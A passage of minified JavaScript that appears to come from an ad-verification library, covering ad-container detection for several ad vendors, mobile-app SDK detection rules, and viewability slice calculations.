      };
    },
    Bn = function () {
      "use strict";

      var e = "_tpi";
      return {
        isApplicable: function (t, n) {
          var r;
          try {
            r = Oe.getFrameId();
          } catch (e) {}
          return n.on("yieldmo") && r && Xe.contains(r, e) && Oe.crossQuerySelector("[data-href*='ads.yieldmo.com']", !0);
        },
        getCssSelector: function () {
          return "[id='" + Oe.getFrameId().replace(e, "") + "']";
        },
        detectionMethod: A.DETECTION_METHODS.BUSTED_IFRAME_YIELDMO
      };
    },
    Gn = function () {
      "use strict";

      var e,
        t,
        n = We.getDoc(),
        r = function () {
          var t,
            r,
            i = "ebDiv";
          return e || (r = (t = Oe.querySelector(n, "div[id*='ebDiv']")) && t.id, e = r && r.split(i)[1]), e;
        },
        i = function () {
          var e = Oe.crossQuerySelector("iframe[id*='ebAd'][id$='" + r() + "']", !0);
          return e && e.id;
        },
        o = function () {
          var e, n;
          return t || (e = i() ? i() : (n = Oe.crossQuerySelector("iframe[id*='ebBannerIFrame_'][id$='" + r() + "']", !0)) && n.id, t = e && "#" + e), t;
        };
      return {
        detectionMethod: A.DETECTION_METHODS.BUSTED_IFRAME_SIZMEK,
        isApplicable: function (e, t) {
          var n,
            i,
            a = We.getWindow(),
            s = e.friendlyIframe && We.getWindow().frameElement,
            c = s && Se(s).isOneByOne(),
            u = (n = ["bs.serving-sys.com/BurstingPipe/adServer", "secure-ds.serving-sys.com/BurstingCachedScripts"], i = We.getDoc().scripts, I(i).findFirst(function (e, t) {
              return I(n).findFirst(function (e, n) {
                return Xe.contains(t.src, n);
              });
            })),
            d = a.EBG && a.EBG.ads && !I(a.EBG.ads).isEmpty();
          return t.on("sizmek") && u && d && c && r() && o();
        },
        getCssSelector: o
      };
    },
    kn = function () {
      "use strict";

      var e,
        t = T.getAggregator().request(x.FEATURES);
      return e || (e = [Gn(), Bn(), Wn()]), I(e).findFirst(function (e, n) {
        return n.isApplicable(Ae, t);
      });
    },
    Hn = function () {
      "use strict";

      var e,
        t = function () {
          We.execAtEndOfThread(function () {
            T.getAggregator().trigger(F.DELAYED_VIEWABILITY_READY_CALL_ONLY);
          });
        };
      return {
        usePlaceholder: !1,
        detectionMethod: A.DETECTION_METHODS.VENDOR_CELTRA,
        isApplicable: function (e, t) {
          return t.on("celtra") && e.isCeltra();
        },
        find: function () {
          var n,
            r = Yn().find();
          return r && r.celtra && r.celtra.loaded && (n = r.celtra.viewabilityObservee, e = Oe.getElementsWindow(n).frameElement || n.parentNode, t()), n;
        },
        getAdContainer: function () {
          return e;
        },
        allowForAdContainerChange: !1
      };
    },
    Yn = function () {
      "use strict";

      var t,
        n = "celtra-ad-v3",
        r = "celtra-ad-v4",
        i = function () {
          var i,
            o = e.contextNode.parentNode;
          return o && (Xe.contains(o.className, n) || Xe.contains(o.className, r)) ? t = o : (i = o && (Oe.querySelector(o, ".celtra-ad-v3") || Oe.querySelector(o, ".celtra-ad-v4"))) && (t = i), t;
        };
      return {
        find: i,
        isApplicable: function () {
          return void 0 !== i();
        }
      };
    },
    jn = function () {
      "use strict";

      var t = T.getAggregator().request(x.MOBILE_APP);
      return {
        usePlaceholder: !0,
        detectionMethod: A.DETECTION_METHODS.AD_HUNT,
        isApplicable: t.isMobileAppEnvironment,
        find: function () {
          return (e = Oe.findChildWithLargestContent(We.getDoc().body)) && e.hasValidSizeForMobileApp && !e[A.IAS_DETECTOR] ? e : void 0;
          var e;
        },
        getAdContainer: function () {
          return e.contextNode.parentNode;
        },
        allowForAdContainerChange: !0
      };
    };
  const qn = new class {
    constructor() {
      this.cachedIsFoundOnPage = !1;
    }
    getDocument() {
      let e;
      try {
        e = We.getDoc();
      } catch (e) {}
      return e;
    }
    get isIE11() {
      const e = this.getDocument();
      return e && e.documentMode;
    }
    hasBrowserSupport() {
      let e = !1;
      const t = this.getDocument(),
        n = !Ae.isDomless(),
        r = !(this.isIE11 || !t || "function" != typeof t.body.attachShadow);
      return n && r && (e = !0), e;
    }
    isFoundOnPage(e) {
      const t = We.getDoc(),
        n = e || t.body;
      let r = !1;
      if (this.cachedIsFoundOnPage) r = !0;else if (this.hasBrowserSupport()) {
        if (n.shadowRoot) r = !0, this.cachedIsFoundOnPage = !0;else {
          const e = n.querySelectorAll("*");
          for (let t = 0; t < e.length; t++) {
            const n = e[t];
            if (n && n.shadowRoot) {
              r = !0, this.cachedIsFoundOnPage = !0;
              break;
            }
          }
        }
      } else r = !1;
      return r;
    }
    querySelector({
      customRootElement: e,
      selector: t
    }) {
      const n = We.getDoc(),
        r = e || n.body;
      let i;
      const o = e => {
        const n = t && t.replace("#", "");
        if (!i) for (let t = 0; t < e.length; t++) {
          const r = e[t];
          r && r.id === n && (i = r), r && r.shadowRoot && o(r.shadowRoot.querySelectorAll("*"));
        }
      };
      return r.shadowRoot && o(r.shadowRoot.querySelectorAll("*")), o(r.querySelectorAll("*")), i;
    }
  }();
  var Kn = function () {
      "use strict";

      var t,
        n = function (e) {
          var t = I.isFunction(e.contextNode.getAttribute) && e.contextNode.getAttribute("data-ias-container");
          return t && "#" + t || e._cl_adpath;
        },
        r = function () {
          var t = T.getAggregator().request(x.FEATURES),
            n = e && 4 === e.integration;
          return !t.on("forceKeepGoogleAdNode") || !n;
        };
      return {
        getAdSelectorId: n,
        detectionMethod: A.DETECTION_METHODS.SPECIFIED_AD,
        isApplicable: function () {
          return Ae.isSpecifiedAd();
        },
        find: function () {
          var i = n(e),
            o = Oe.crossQuerySelector(i),
            a = Ae.isPageOnShadowDomWhitelist(),
            s = function (e) {
              return r() && Oe.getNodeArea(e) < 1;
            }(o);
          return o ? (t = Oe.getParent(o), s && (t = o, o = Oe.findElementsWithSize(o))) : a && qn.isFoundOnPage() && (o = qn.querySelector({
            selector: i
          }), t = Oe.getParent(o)), o;
        },
        getAdContainer: function () {
          return t;
        },
        allowForAdContainerChange: !0,
        shouldValidateAdNode: r
      };
    },
    Xn = function () {
      "use strict";

      var t;
      return {
        detectionMethod: A.DETECTION_METHODS.SPECIFIED_AD_COMPOUND,
        isApplicable: function () {
          return Ae.isCompoundAd();
        },
        find: function () {
          var n,
            r,
            i = [];
          return (n = e._cl_adpath, /\[(.*)\]/.exec(n)[1].split(",")).forEach(function (e) {
            (r = Oe.crossQuerySelector(e)) && (t = Oe.getParent(r), Oe.getNodeArea(r) < 1 && (t = r, r = Oe.findElementsWithSize(r))), i.push(r);
          }), i;
        },
        getAdContainer: function () {
          return t;
        },
        allowForAdContainerChange: !0
      };
    },
    zn = function () {
      "use strict";

      return {
        usePlaceholder: !0,
        detectionMethod: A.DETECTION_METHODS.AD_HUNT,
        isApplicable: function () {
          return !0;
        },
        find: Fn,
        getAdContainer: function () {
          return e.contextNode.parentNode;
        },
        allowForAdContainerChange: !0
      };
    },
    Jn = function () {
      "use strict";

      return {
        detectionMethod: A.DETECTION_METHODS.VIDEO,
        find: T.getAggregator().request(x.VIDEO).findAdNode,
        isApplicable: Ae.isVideo,
        getAdContainer: function () {
          return e.contextNode.parentNode;
        },
        allowForAdContainerChange: !0
      };
    },
    Qn = function (e, t) {
      "use strict";

      var n,
        r,
        i = [er(), Zn(), $n()];
      return r = I(i).findFirst(function (n, r) {
        return r.isApplicable(e, t);
      }), (n = tr()).isApplicable(t) && (n.setBaseStrategy(r), r = n), r;
    },
    $n = function () {
      "use strict";

      return {
        calcDims: function (e, t) {
          var n,
            r,
            i = new Se(e);
          return Oe.isClippable(e, t) && (n = Oe.getClippedDimensions(e, t), r = i.getRounded(), i.set("height", n.height < r.height ? n.height : r.height || 1), i.set("width", n.width < r.width ? n.width : r.width || 1)), i;
        },
        allowsOptimization: !1,
        isApplicable: function (e) {
          var t = (Ae.isSpecifiedAd() || Ae.isBustedIframe()) && Oe.nodeIsInWindow(e, We.getTop()),
            n = !Oe.elementIsEmbedded(e);
          return t || n;
        }
      };
    },
    Zn = function () {
      "use strict";

      var e = T.getAggregator().request(x.IFRAME_CALCULATOR_HELPER);
      return {
        calcDims: e.calcDims,
        getClippedDims: e.getClippedDims,
        allowsOptimization: !0,
        isApplicable: function (e) {
          return !(Ae.isSpecifiedAd() || Ae.isBustedIframe()) && Oe.elementIsEmbedded(e);
        }
      };
    },
    er = function () {
      "use strict";

      var e = T.getAggregator().request(x.IFRAME_CALCULATOR_HELPER);
      return {
        calcDims: function (t) {
          var n = e.calcDims(),
            r = new Se(t).getRounded();
          return n.set("height", r.height), n.set("width", r.width), n;
        },
        getClippedDims: e.getClippedDims,
        allowsOptimization: !1,
        isApplicable: function (e, t) {
          var n = (Ae.isSpecifiedAd() || Ae.isBustedIframe()) && Ae.embedded && !Oe.nodeIsInWindow(t, We.getTop()),
            r = Ae.isCeltra() && Oe.elementIsEmbedded(e);
          return n || r;
        }
      };
    },
    tr = function () {
      "use strict";

      var e;
      return {
        calcDims: function (t, n, r) {
          var i = I.isDef(r) ? r.getAdNodeDimensions() : void 0;
          return e && I.isUndef(i) && (i = e.calcDims(t, n)), i;
        },
        isApplicable: function (e) {
          var t = k(),
            n = T.getAggregator(),
            r = n.request(x.BROWSER),
            i = n.request(x.FEATURES),
            o = n.request(x.CONTEXT);
          return o.isDeviceTypeGroupMobile() && t.applies(r, i, o);
        },
        allowsOptimization: !1,
        setBaseStrategy: function (t) {
          e = t;
        }
      };
    },
    nr = function (e) {
      "use strict";

      e = e || We.getWindow();
      var t = function (n, r) {
          n = n || e, r = r || {
            top: 0,
            left: 0,
            width: We.getMaxNumber(),
            height: We.getMaxNumber()
          };
          for (var i, o = n.parent.frames, a = !1, s = 0, c = o.length; s < c; s++) if (o[s] == n) {
            i = o[s], a = !0;
            break;
          }
          if (a) {
            var u = Oe.getRect(i.frameElement);
            r.left += u.left, r.top += u.top;
            try {
              r.width = We.min(r.width, u.width), r.height = We.min(r.height, u.height);
            } catch (e) {
              T.getAggregator().trigger(F.ERROR, A.ERROR_CODES.GET_AD_DIMENSIONS);
            }
            n !== We.getTop() && t(n.parent, r);
          }
          return r;
        },
        n = function () {
          var n,
            r,
            i,
            o,
            a,
            s,
            c,
            u,
            d,
            g,
            f,
            l = {};
          try {
            g = We.getMaxNumber(), f = We.getMaxNumber(), Ae.friendly ? (s = (o = t()).left, c = o.top, g = o.width, f = o.height, u = (a = Oe.browserWindowPosition()).scrX + s, d = a.scrY + c) : I.isDef(e.mozInnerScreenX) && (u = We.round(e.mozInnerScreenX), d = We.round(e.mozInnerScreenY)), l = {
              scrX: u,
              scrY: d,
              iFrameClippingWidth: g,
              iFrameClippingHeight: f
            }, I.isDef(e.innerWidth) ? (r = e.innerWidth, i = e.innerHeight) : e.frameElement && I.isDef(e.frameElement.clientWidth) && (r = e.frameElement.clientWidth, i = e.frameElement.clientHeight), n = {
              width: r,
              height: i
            }, l.height = n.height, l.width = n.width;
          } catch (e) {
            T.getAggregator().trigger(F.ERROR, A.ERROR_CODES.GET_AD_DIMENSIONS);
          }
          return l;
        };
      return {
        calcDims: function () {
          return new Se(n());
        },
        getClippedDims: function () {
          var e = n();
          return new Se({
            scrX: e.scrX,
            scrY: e.scrY,
            width: e.iFrameClippingWidth,
            height: e.iFrameClippingHeight
          });
        }
      };
    },
    rr = function () {
      "use strict";

      return {
        createInstance: function (e, t, n) {
          return Ae.isDomless() ? new or() : new ir(e, t, n);
        }
      };
    },
    ir = function (r, i, o) {
      "use strict";

      var a,
        s,
        c = T.getAggregator().request(x.BROWSER),
        u = e && e.contextNode && e.contextNode.parentNode ? e.contextNode.parentNode : null,
        d = Vn(i, o),
        g = function () {
          var e, t, n, r;
          a = a || function (e, t) {
            var n = [Xn(), Kn()],
              r = [Un(), jn(), Jn(), Ln(), Hn(), xn(), zn()],
              i = n.concat(r);
            return I(i).findFirst(function (n, r) {
              return r.isApplicable(e, t);
            });
          }(Ae, o), e = a.find(), Ae.friendlyIframe && Ae.isBlockingSizmekTag() && m(e), !e && a.usePlaceholder ? (f(), E()) : e && (n = I(e).isArray() ? e : [e], t = a.getAdContainer(), r = a.allowForAdContainerChange, I(n).each(function (e, n) {
            d.addAdComponent(n, I.resolve(a.detectionMethod), t, r);
          }));
        },
        f = function () {
          var t;
          d.hasAd() || (t = Oe.getPlaceholderSpan(), u.insertBefore(t, e.contextNode.nextSibling), d.addAdComponent(t, A.DETECTION_METHODS.AD_PLACEHOLDER, Oe.getParent(t)));
        },
        l = function (e, t) {
          var n = !1;
          I(e).each(function (e, t) {
            t.addedNodes && t.addedNodes.length > 0 && (n = !0);
          }), n && (T.getAggregator().trigger(F.NODES_ADDED), t.disconnect());
        },
        E = function () {
          Ae.isDeviceTypeGroupMobile() && c.hasMutationObserver() && We.getMutationObserver(l).observe(u, {
            childList: !0
          });
        },
        p = function (e, t) {
          var n,
            r = !1;
          I(e).each(function (e, t) {
            switch (t.type) {
              case "childList":
                I(t.addedNodes).each(function (e, t) {
                  t.nodeName && "script" === t.nodeName.toLowerCase() && (r = !0);
                });
                break;
              case "attributes":
                t.target.height * t.target.width <= 1 && (r = !0);
            }
          }), r && ((n = Gn()).isApplicable(Ae, o) && (t.disconnect(), a = Ln(), d.clearCollection(), T.getAggregator().trigger(F.NODES_ADDED)), setTimeout(function () {
            n.isApplicable(Ae, o) && (t.disconnect(), a = Ln(), d.clearCollection(), T.getAggregator().trigger(F.NODES_ADDED));
          }, 0));
        },
        m = function (e) {
          var t, n;
          if (!s && c.hasMutationObserver() && Oe.isWindow(e)) try {
            s = We.getMutationObserver(p), t = e && e.frameElement, n = e && e.document && e.document.body, s.observe(t, {
              attributes: !0,
              attributeFilter: ["height", "width"]
            }), s.observe(n, {
              childList: !0,
              subtree: !0
            });
          } catch (e) {}
        };
      return function (e) {
        var r = !1;
        if (!I.isUndef(t.MutationObserver)) {
          var i = new t.MutationObserver(function (e) {
              We.execAtEndOfThread(function () {
                r && I(e).each(function (e, t) {
                  t.addedNodes.length && T.getAggregator().trigger(F.AD_COMPONENT_ADDED, t.addedNodes), t.removedNodes.length && T.getAggregator().trigger(F.AD_COMPONENT_REMOVED, t.removedNodes);
                });
              });
            }),
            o = function () {
              r = !0, We.setTimeout(function () {
                r = !1;
              }, 40);
            };
          T.getAggregator().on(F.AD_COMPONENT_CLICKED, o), T.getAggregator().on(F.AD_COMPONENT_TOUCHED, o), T.getAggregator().on(F.AD_COMPONENT_MOUSED_OVER, o), T.getAggregator().on(F.AD_COMPONENT_CLICKED, Ht.adComponent.trackClick), T.getAggregator().on(F.AD_COMPONENT_MOUSED_OVER, Ht.adComponent.trackMouseOver), T.getAggregator().on(F.AD_COMPONENT_MOUSED_OUT, Ht.adComponent.trackMouseOut), T.getAggregator().on(F.AD_COMPONENT_TOUCHED, Ht.mobile.trackTouch), _e.addEvent(t, U.BEFORE_UNLOAD, Ht.finalizeAllCollectedData, !1), _e.whenReady(function () {
            try {
              i.observe(n.body, {
                attributes: !0,
                childList: !0,
                characterData: !0
              });
            } catch (t) {
              e.add(A.ERROR_CODES.AC_WATCHER);
            }
          }, We.getDoc());
        }
      }(r), {
        find: function () {
          return d.isUsingPlaceholder() || !d.hasAd() ? g() : d.refresh(), d;
        },
        getDetectionMethod: function () {}
      };
    },
    or = function () {
      "use strict";

      var e = function () {
        return null;
      };
      return {
        find: e,
        getDetectionMethod: e
      };
    },
    ar = function (e) {
      "use strict";

      var t = new dr(),
        n = new gr(),
        r = "undefined" != typeof navigator ? navigator.userAgent.toLowerCase() : "",
        i = function () {
          var e,
            t = ["FBAN", "FBAV", "Twitter", "Instagram", "Flipboard", "Snapchat", "LinkedInApp", "Pinterest"],
            n = !1;
          for (e = 0; e < t.length; e++) if (r.indexOf(t[e].toLowerCase()) > -1) {
            n = !0, T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
              output: t[e].substring(0, 2)
            }, W.MAPP1_EXCLUSION_LIST_MATCH, {
              type: A.IMPRESSION_EVENT
            });
            break;
          }
          return n;
        };
      return function () {
        var r = "",
          o = T.getAggregator().request(x.OMID_AD_SESSION_CONTEXT),
          a = Ae.isDomless() || o && "app" === o.environment,
          s = o && "web" === o.environment,
          c = e.bootstrapOn(W.MOB_OR_TAB),
          u = e.bootstrapOn(W.MOB_APP_WEBVIEW),
          d = e.bootstrapOn(W.MOB_APP),
          g = c && u || d;
        try {
          a || !s && g && !i() ? (r = t.detect(), t.hasDetectedMobileApp() && ("s_serv" !== r && "u_cars" !== r || (fr[fr.length - 1].detectionRules.userAgent[0] = "/"), n.detect(), T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
            output: "1"
          }, W.MOBILE_APP_ENVIRONMENT, {
            type: A.IMPRESSION_EVENT
          }), T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
            output: r
          }, W.MATCHED_MOBILE_APP_DETECTION_RULE, {
            type: A.IMPRESSION_EVENT
          }))) : s && T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
            output: "a_oweb"
          }, W.MATCHED_MOBILE_APP_DETECTION_RULE, {
            type: A.IMPRESSION_EVENT
          });
        } catch (e) {
          T.getAggregator().trigger(F.ERROR, A.ERROR_CODES.MOBILE_APP);
        }
      }(), {
        excludedByUserAgent: i,
        isMobileAppEnvironment: function () {
          return t.hasDetectedMobileApp();
        },
        isSafeToInjectMraid: function () {
          return n.isSafeToInjectMraid();
        }
      };
    };
  const sr = {
      url: {
        STRINGIFIED_METHOD: "u",
        detect: function (r) {
          "use strict";

          if (Ae.isDomless()) return !1;
          const i = We.getWindow().location.href,
            o = [i];
          try {
            o.push(top.location.href);
          } catch (e) {}
          try {
            o.push(parent.location.href);
          } catch (e) {}
          if (Ae.embedded) {
            try {
              o.push(parent.document.referrer);
            } catch (e) {}
            try {
              o.push(n.referrer);
            } catch (e) {}
          }
          try {
            "jsi" !== e.mode && o.push(t.location.href);
          } catch (e) {}
          try {
            o.push(e.jsref);
          } catch (e) {}
          return o.sort(function (e, t) {
            return e.length > t.length ? 1 : e.length < t.length ? -1 : 0;
          }), !!I(r).findFirst(function (e, t) {
            let n,
              r,
              a = !1;
            const s = "mobfox" === t ? o : [i];
            for (r = 0; r < s.length; r++) {
              n = s[r];
              const e = "string" == typeof t ? [t] : t;
              if (I(e).isArray() && e) for (let t = 0; t < e.length && (a = n.indexOf(e[t]) > -1, !1 !== a); t++);
              if (a) break;
            }
            return a;
          });
        }
      },
      userAgent: {
        STRINGIFIED_METHOD: "a",
        detect: function (e) {
          "use strict";

          return !Ae.isDomless() && !!I(e).findFirst(function (e, t) {
            let n,
              r = !1;
            const i = We.getWindow();
            return I.isDef(i.navigator) && I.isDef(i.navigator.userAgent) && (n = i.navigator.userAgent, r = n && -1 !== n.indexOf(t)), r;
          });
        }
      },
      javascript: {
        STRINGIFIED_METHOD: "j",
        detect: function (e) {
          "use strict";

          return !!I(e).findFirst(function (e, t) {
            let n = !1;
            return n = I.isDef(Xe.stringToProp(t)), n;
          });
        }
      },
      scriptSrc: {
        STRINGIFIED_METHOD: "s",
        detect: function (e) {
          "use strict";

          return !Ae.isDomless() && !!I(e).findFirst(function (e, t) {
            return Oe.containsScriptTagWithSrc(function (e) {
              let n = !1;
              return n = I.isDef(e) && -1 !== e.indexOf(t), n;
            });
          });
        }
      }
    },
    cr = function () {
      "use strict";

      const e = function (e, t) {
        let n;
        const r = sr[e];
        return r.detect(t) && (n = r.STRINGIFIED_METHOD), n;
      };
      return {
        process: function (t) {
          return I(t).map(e).join("");
        }
      };
    };
  var ur = [{
      STRINGIFIED_APPDET: "omid",
      detectionRules: {
        javascript: ["omidSupported"]
      }
    }, {
      STRINGIFIED_APPDET: "file",
      detectionRules: {
        url: ["file:"],
        scriptSrc: ["file:"]
      }
    }, {
      STRINGIFIED_APPDET: "cont",
      detectionRules: {
        url: ["content:"]
      }
    }, {
      STRINGIFIED_APPDET: "appl",
      detectionRules: {
        url: ["applewebdata:"]
      }
    }, {
      STRINGIFIED_APPDET: "adma",
      detectionRules: {
        javascript: ["ADMARVEL"]
      }
    }, {
      STRINGIFIED_APPDET: "admb",
      detectionRules: {
        userAgent: ["afma-sdk"],
        url: ["afma-sdk"]
      }
    }, {
      STRINGIFIED_APPDET: "imbi",
      detectionRules: {
        javascript: ["InmobiObj"]
      }
    }, {
      STRINGIFIED_APPDET: "mopb",
      detectionRules: {
        url: ["ads.mopub.com"],
        javascript: ["mopubFinishLoad"]
      }
    }, {
      STRINGIFIED_APPDET: "pand",
      detectionRules: {
        javascript: ["PandoraApp"]
      }
    }, {
      STRINGIFIED_APPDET: "sads",
      detectionRules: {
        javascript: ["mraid.sasSendMessage"]
      }
    }, {
      STRINGIFIED_APPDET: "ogry",
      detectionRules: {
        url: ["ogury.io"],
        scriptSrc: ["OguryFR"]
      }
    }, {
      STRINGIFIED_APPDET: "cnvt",
      detectionRules: {
        url: ["adsx.greystripe.com/openx/www/delivery/ia.php"]
      }
    }, {
      STRINGIFIED_APPDET: "mobf",
      safeToInjectMraid: !0,
      detectionRules: {
        url: ["mobfox"]
      }
    }, {
      STRINGIFIED_APPDET: "innr",
      detectionRules: {
        url: ["inner-active.mobi"]
      }
    }, {
      STRINGIFIED_APPDET: "apnx",
      detectionRules: {
        javascript: ["anjam"]
      }
    }, {
      STRINGIFIED_APPDET: "aers",
      detectionRules: {
        userAgent: ["AerServ"]
      }
    }, {
      STRINGIFIED_APPDET: "tapj",
      detectionRules: {
        url: [["tapjoyads", "app_id"]]
      }
    }, {
      STRINGIFIED_APPDET: "quan",
      detectionRules: {
        userAgent: ["QuantcastSDK"]
      }
    }, {
      STRINGIFIED_APPDET: "cars",
      safeToInjectMraid: !0,
      detectionRules: {
        url: [["carsales", ".android"], ["carsales", ".ios"]]
      }
    }, {
      STRINGIFIED_APPDET: "mrai",
      detectionRules: {
        javascript: ["mraid"]
      }
    }],
    dr = function () {
      "use strict";

      var t,
        n = function (e, t) {
          var n,
            r = cr().process(t.detectionRules);
          return r && (n = r + "_" + t.STRINGIFIED_APPDET), n;
        };
      return {
        detect: function () {
          return "" === (t = (t = I(ur).map(n)).length > 0 ? t[0] : "") && e.hasOwnProperty("serverSideAppDetection") && 0 !== e.serverSideAppDetection.length && (t = "s_serv"), t;
        },
        hasDetectedMobileApp: function () {
          return void 0 !== t && "" !== t;
        }
      };
    },
    gr = function () {
      "use strict";

      var e = [],
        t = [],
        n = function (t, n) {
          var r,
            i = cr().process(n.detectionRules);
          return i && (e.push(n.STRINGIFIED_SDK + "*" + i), r = n), r;
        };
      return {
        detect: function () {
          return (t = I(fr).map(n)).length > 0 && T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
            output: function () {
              return e.join(".");
            }
          }, W.APP_SDKS_DETECTED, {
            type: A.IMPRESSION_EVENT
          }), t.length > 0;
        },
        isSafeToInjectMraid: function () {
          return 1 === t.length && I.isDef(t[0].safeToInjectMraid) && t[0].safeToInjectMraid;
        }
      };
    },
    fr = [{
      STRINGIFIED_SDK: "adma",
      safeToInjectMraid: !0,
      detectionRules: {
        javascript: ["ADMARVEL"],
        url: ["AdMarvel"]
      }
    }, {
      STRINGIFIED_SDK: "admb",
      safeToInjectMraid: !0,
      detectionRules: {
        userAgent: ["afma-sdk"],
        url: ["afma-sdk"]
      }
    }, {
      STRINGIFIED_SDK: "imbi",
      safeToInjectMraid: !0,
      detectionRules: {
        javascript: ["InmobiObj"]
      }
    }, {
      STRINGIFIED_SDK: "mmed",
      detectionRules: {
        url: ["mmsdk"],
        scriptSrc: ["mmsyscache"]
      }
    }, {
      STRINGIFIED_SDK: "mopb",
      safeToInjectMraid: !0,
      detectionRules: {
        javascript: ["mopubFinishLoad"],
        url: ["ads.mopub.com"]
      }
    }, {
      STRINGIFIED_SDK: "pand",
      detectionRules: {
        javascript: ["PandoraApp"]
      }
    }, {
      STRINGIFIED_SDK: "ambe",
      safeToInjectMraid: !0,
      detectionRules: {
        url: ["amobee"]
      }
    }, {
      STRINGIFIED_SDK: "smat",
      safeToInjectMraid: !0,
      detectionRules: {
        javascript: ["smaato_bridge"]
      }
    }, {
      STRINGIFIED_SDK: "afrm",
      safeToInjectMraid: !0,
      detectionRules: {
        javascript: ["Adform"]
      }
    }, {
      STRINGIFIED_SDK: "vrve",
      safeToInjectMraid: !0,
      detectionRules: {
        javascript: ["vrvsdk"]
      }
    }, {
      STRINGIFIED_SDK: "sads",
      detectionRules: {
        javascript: ["mraid.sasSendMessage"],
        url: ["smartadserver.com"]
      }
    }, {
      STRINGIFIED_SDK: "ogry",
      safeToInjectMraid: !0,
      detectionRules: {
        url: ["ogury.io"],
        scriptSrc: ["OguryFR"]
      }
    }, {
      STRINGIFIED_SDK: "cnvt",
      detectionRules: {
        url: ["adsx.greystripe.com/openx/www/delivery/ia.php"]
      }
    }, {
      STRINGIFIED_SDK: "mobf",
      safeToInjectMraid: !0,
      detectionRules: {
        url: ["mobfox"]
      }
    }, {
      STRINGIFIED_SDK: "innr",
      detectionRules: {
        url: ["inner-active.mobi"]
      }
    }, {
      STRINGIFIED_SDK: "apnx",
      detectionRules: {
        javascript: ["anjam"]
      }
    }, {
      STRINGIFIED_SDK: "aers",
      safeToInjectMraid: !0,
      detectionRules: {
        userAgent: ["AerServ"]
      }
    }, {
      STRINGIFIED_SDK: "tapj",
      detectionRules: {
        url: [["tapjoyads", "app_id"]]
      }
    }, {
      STRINGIFIED_SDK: "quan",
      detectionRules: {
        userAgent: ["QuantcastSDK"]
      }
    }, {
      STRINGIFIED_SDK: "mrad",
      safeToInjectMraid: !0,
      detectionRules: {
        userAgent: ["unmatchabledetectionstring"]
      }
    }],
    lr = function (e) {
      "use strict";

      var t = [],
        n = function (e, t, n) {
          return new Ir(0, e, n, n + t);
        };
      return function () {
        if (e.height < 10) t.push({
          geometry: new Ir(0, e.width, 0, e.height),
          percentageInViewContribution: 100,
          isInView: !1
        });else for (var r, i = Math.floor(e.height), o = i % 10, a = (i - o) / 10, s = 0; s < 10; s++) {
          var c = s < o ? a + 1 : a,
            u = {
              geometry: n(e.width, c, r || 0),
              percentageInViewContribution: 10,
              isInView: !1
            };
          t.push(u), r = u.geometry.value().bottomY;
        }
      }(), {
        getSlices: function () {
          return t;
        }
      };
    },
    Er = function () {
      "use strict";

      var e,
        t = A.VIEWABILITY_IN_VIEW_THRESHOLDS_MOBILE_GRID.length,
        n = A.VIEWABILITY_IN_VIEW_THRESHOLDS_MOBILE_GRID,
        r = [];
      return {
        getConfig: function (i) {
          if (e) return e;
          i.height < t && (t = 1, n = [100]);
          for (var o = 0; o < t; o++) r.push(!1);
          return e = {
            numberOfSlices: t,
            defaultSliceArray: r,
            percentInViewSliceArray: n
          };
        }
      };
    },
    pr = function (e, t) {
      "use strict";

      var n = {
          mbrd: !1,
          mbvs: [],
          mbe: "n",
          mbv: 9,
          mbs: [],
          mbm: 1,
          mbivs: []
        },
        r = function (e, t) {
          var n,
            r = 0,
            i = function (e, t) {
              var n = [],
                r = e.geometry.value();
              return I(t).each(function (t, i) {
                if (e.geometry.doesIntersect(i)) {
                  var o = i.value(),
                    a = Math.max(r.leftX, o.leftX),
                    s = Math.min(r.rightX, o.rightX),
                    c = Math.max(r.topY, o.topY),
                    u = Math.min(r.bottomY, o.bottomY);
                  n.push(new Ir(a, s, c, u));
                }
              }), n;
            }(e, t);
          return I(i).each(function (e, t) {
            n = t.value(), r += n.area;
          }), r;
        },
        i = function (t) {
          I(e).each(function (e, n) {
            n.isInView = r(n, t) >= n.geometry.value().area;
          });
        };
      return t.addListener(i), {
        getPercentInView: function () {
          var t = function () {
            var t = 0;
            return n.mbs = [], I(e).each(function (e, r) {
              n.mbs.push(r.isInView), r.isInView && (t += r.percentageInViewContribution);
            }), t;
          }();
          return n.mbrd = 1, t !== n.mbp && n.mbivs.push([Ae.getTagTime(), t]), n.mbp = t, t;
        },
        removePixels: function () {
          void 0 !== t && t.stop();
        },
        getPixelStateForDebug: function () {
          return n.mbm = 1, n.mbpr = [], n.mbir = [], I(e).each(function (e, t) {
            n.mbpr.push(A.NA), n.mbir.push(!1);
          }), n;
        },
        isReadyToMeasure: function () {
          return !0;
        },
        getSliceStatus: function () {
          var t = [];
          return I(e).each(function (e, n) {
            t.push(n.isInView);
          }), t;
        }
      };
    },
    mr = function (e) {
      "use strict";

      var t = Er();
      return {
        getSliceStatus: function (n, r, i, o) {
          var a,
            s = [],
            c = n.getRounded(),
            u = c.height,
            d = c.scrY,
            g = new Se({
              scrX: c.scrX,
              width: c.width
            }),
            f = t.getConfig(c).numberOfSlices;
          g.set("height", We.floor(u / f));
          for (var l = 0; l < f; l++) g.set("scrY", We.ceil(d + u / f * l)), a = 100 === e.calcPercentInView(g, r, i, o), s.push(a);
          return s;
        }
      };
    },
    Ir = function (e, t, n, r) {
      "use strict";

      var i = Math.ceil(e),
        o = Math.ceil(t),
        a = Math.ceil(n),
        s = Math.ceil(r),
        c = o - i,
        u = s - a,
        d = c * u,
        g = function () {
          return {
            leftX: i,
            rightX: o,
            topY: a,
            bottomY: s,
            width: c,
            height: u,
            area: d
          };
        };
      return {
        value: g,
        doesIntersect: function (e) {
          var t = g(),
            n = e.value();
          return n.leftX < t.rightX && n.rightX > t.leftX && n.topY < t.bottomY && n.bottomY > t.topY;
        }
      };
    },
    hr = function () {
      "use strict";

      return {
        createInstance: function (e, t) {
          return new IntersectionObserver(e, t);
        }
      };
    },
    Tr = function (e, t) {
      "use strict";

      var n,
        r = [],
        i = [],
        o = function (e, t) {
          -1 === e.indexOf(t) && e.push(t);
        },
        a = function (e) {
          var t,
            n = function () {
              var e = [];
              return I(i).each(function (t, n) {
                var r = n.value();
                o(e, r.topY), o(e, r.bottomY);
              }), e = e.sort(function (e, t) {
                return e - t;
              });
            }();
          i = [];
          for (var r = 0; n.length > r && (t = r, n.length !== t + 1); r++) {
            var a = n[r],
              s = n[r + 1];
